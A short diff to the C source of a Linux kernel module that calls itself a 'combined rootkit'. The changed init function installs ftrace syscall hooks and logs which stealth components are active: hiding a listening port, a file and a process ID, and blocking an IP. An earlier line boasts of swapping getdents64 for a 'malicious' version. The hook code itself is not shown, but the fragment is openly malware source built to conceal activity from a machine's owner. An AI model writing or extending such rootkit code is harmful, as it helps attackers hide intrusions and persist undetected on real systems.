@@ -80,14 +80,24 @@ static struct ftrace_hook hooks[] = {
 static int __init rootkit_enter(void) {
 
 	unsigned int err;
+
 	printk(KERN_INFO "combined rootkit: is operating\n");
 
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-
 	if(err)
 		return err;
 
-	printk(KERN_INFO "switched getdents64 syscall to malicious one\n");
+	if (port_to_hide != 0)
+		printk(KERN_INFO "loaded component: port hiding. hiding listening port %u\n", port_to_hide);
+
+	if (NULL != file_to_hide)
+		printk(KERN_INFO "loaded component: file hiding. hiding file %s\n", file_to_hide);
+	
+	if (NULL != pid_to_hide)
+		printk(KERN_INFO "loaded component: process hiding. hiding PID %s\n", pid_to_hide);
+
+	if (NULL != ip_to_block)
+		printk(KERN_INFO "loaded component: ip blocking. blocking incomming traffic from IP %s\n", ip_to_block);
 
 	return 0;
 }
